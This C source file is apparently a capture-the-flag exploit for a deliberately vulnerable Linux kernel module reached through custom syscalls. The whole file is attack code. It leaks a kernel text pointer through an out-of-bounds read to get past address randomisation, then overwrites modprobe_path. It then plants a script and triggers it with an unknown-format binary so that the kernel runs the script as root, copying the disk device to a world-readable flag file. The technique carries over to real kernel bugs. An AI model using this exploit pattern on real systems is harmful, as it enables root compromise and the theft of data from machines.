#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>


uint64_t modprobe_path_value = 0x6f6d2f6e6962732f;

void main() {
	syscall(600,0x2000000000000001); // initialize with 0 heap alloc and beeg count

	uint64_t i_0;
	syscall(603,0, &i_0);
	printf("vec[0] = %lx\n", i_0);

	uint64_t ptr_into_text;
	for(long i = 0; i < 1000; i++) {
		uint64_t ptr;
		syscall(603,i, &ptr);
		if ((ptr >> 32 == 0xffffffff)  && ((ptr & 0xffff) == 0x92cd)) { // 
			ptr_into_text = ptr;
			printf("vec[%ld] = %lx\n",i, ptr);	
		}
	}
	if (ptr_into_text==0) {
		printf("couldn't find ptr into text???");
		exit(1);
	}

	uint64_t modprobe_path = ptr_into_text + 0x277a73;
	printf("&modprobe_path = %lx\n", modprobe_path);
	uint64_t distance_to_modprobe_path = ((modprobe_path - i_0) / 8) + 1;

	uint64_t offset_to_modprobe_path = 0;
	for(long i = 0; i < 1000; i++) {
		uint64_t ptr;
		syscall(603,distance_to_modprobe_path+i, &ptr);
		if (ptr == modprobe_path_value) { // 
			offset_to_modprobe_path = distance_to_modprobe_path +i;
			printf("vec[%ld] = %lx\n",distance_to_modprobe_path+i, ptr);	
			break;
		}
	}

	if (offset_to_modprobe_path==0) {
		printf("couldn't find modprobe_path offset???");
		exit(1);
	}

	syscall(602,offset_to_modprobe_path, 0x77702f656d6f682f);
	syscall(602,offset_to_modprobe_path+1, 0x782f6e);
	system("echo -ne \"#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag\" > x");
	system("echo -ne \"\xff\xff\xff\xff\" > dummy");
	system("chmod +x ./dummy");
	system("chmod +x ./x");
	system("./dummy");
	system("cat /tmp/flag");
}
